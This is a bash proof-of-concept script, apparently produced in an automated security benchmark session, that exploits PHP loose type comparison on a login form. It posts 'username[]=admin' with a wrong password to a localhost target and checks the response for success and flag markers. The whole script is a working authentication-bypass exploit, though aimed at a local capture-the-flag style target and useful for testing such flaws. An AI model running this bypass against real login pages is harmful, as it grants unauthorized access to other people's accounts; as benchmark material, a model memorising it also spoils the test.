#!/bin/bash
# POC: Type Juggling Authentication Bypass - Demonstrates authentication bypass by sending username as array parameter with incorrect password, showing success indicators
# Target: ./repo
# Created: 2025-11-07T21:38:33.382Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# Type Juggling Authentication Bypass POC
# This script demonstrates how sending username as an array causes authentication bypass
# due to PHP's loose type comparison

# Determine target URL - try common defaults
TARGET_URL="${TARGET_URL:-http://localhost:8080}"

# If localhost fails, try common ports
if ! curl -s -m 2 "${TARGET_URL}/index.php" > /dev/null 2>&1; then
    TARGET_URL="http://localhost:80"
fi

if ! curl -s -m 2 "${TARGET_URL}/index.php" > /dev/null 2>&1; then
    TARGET_URL="http://127.0.0.1:8080"
fi

ENDPOINT="/index.php"
FULL_URL="${TARGET_URL}${ENDPOINT}"

echo "=========================================="
echo "Type Juggling Authentication Bypass POC"
echo "=========================================="
echo "Target: $FULL_URL"
echo ""

# First, verify the target is accessible
echo "[*] Checking target accessibility..."
if ! curl -s -m 5 "$FULL_URL" > /dev/null 2>&1; then
    echo "ERROR: Target $FULL_URL is not accessible"
    echo "Please set TARGET_URL environment variable or ensure the application is running"
    echo "Example: TARGET_URL=http://localhost:8000 ./$(basename $0)"
    exit 1
fi
echo "✓ Target is accessible"
echo ""

# Test 1: Normal attempt with wrong password (baseline - should fail)
echo "[*] Test 1: Baseline - Normal login with wrong password (should FAIL)"
echo "Sending: username=admin&password=wrongpassword&login=Login"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -d "username=admin&password=wrongpassword&login=Login")

echo "HTTP Response contains 'Welcome': $(echo "$RESPONSE" | grep -c "Welcome")"
echo "HTTP Response contains 'flag': $(echo "$RESPONSE" | grep -c "flag")"
echo "HTTP Response contains 'Congratulations': $(echo "$RESPONSE" | grep -c "Congratulations")"

if echo "$RESPONSE" | grep -qi "Welcome\|Congratulations.*flag"; then
    echo "⚠ Unexpected: Normal wrong password attempt succeeded"
else
    echo "✓ Expected: Normal wrong password attempt failed"
fi
echo ""

# Test 2: Type juggling bypass - username as array with wrong password
echo "[*] Test 2: TYPE JUGGLING BYPASS - username as array parameter with wrong password"
echo "Sending: username[]=admin&password=wrongpassword&login=Login"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -d "username[]=admin&password=wrongpassword&login=Login" \
  --max-time 10)

echo "HTTP Response contains 'Welcome': $(echo "$RESPONSE" | grep -c "Welcome")"
echo "HTTP Response contains 'flag': $(echo "$RESPONSE" | grep -c "flag")"
echo "HTTP Response contains 'Congratulations': $(echo "$RESPONSE" | grep -c "Congratulations")"

# Extract and display relevant success indicators
SUCCESS_INDICATORS=$(echo "$RESPONSE" | grep -oE "Welcome [A-Za-z0-9]+|Congratulations|flag:" | head -5)

if [ -n "$SUCCESS_INDICATORS" ]; then
    echo ""
    echo "✓ SUCCESS INDICATORS FOUND:"
    echo "$SUCCESS_INDICATORS"
    echo ""
    echo "✗ VULNERABLE - Type juggling bypass SUCCESSFUL!"
    echo "Authentication was bypassed with array parameter despite wrong password!"
    echo ""
    echo "Evidence:"
    echo "- Sent username as array: username[]=admin"
    echo "- Sent wrong password: password=wrongpassword"
    echo "- Result: Authenticated successfully (page contains success markers)"
    echo ""
    exit 0
else
    echo ""
    echo "✓ Type juggling bypass did not bypass authentication"
    exit 1
fi